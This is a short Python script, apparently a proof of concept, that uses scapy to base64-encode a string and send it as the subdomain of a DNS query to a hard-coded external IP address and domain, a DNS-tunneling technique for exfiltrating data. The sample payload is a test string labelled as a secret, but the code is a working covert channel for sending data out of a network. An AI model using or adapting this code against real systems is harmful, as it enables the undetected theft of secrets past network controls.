from scapy.all import DNS, DNSQR, IP, sr1, UDP
import base64

def dns_request(sub_domain):
    qname = f"{sub_domain}.dns.bitlus.online/api/dnstunneling"
    dns_req = IP(dst='79.76.56.138')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
    answer = sr1(dns_req, verbose=1, timeout=5)
    if answer:
        answer.show()  # This prints the entire DNS response
    else:
        print("No response received.")

text = "testSuperSecret"
text_bytes = base64.urlsafe_b64encode(text.encode("ascii"))
text_str = text_bytes.decode("ascii")   
# print("text_str: ", text_str)
dns_request(text_str)

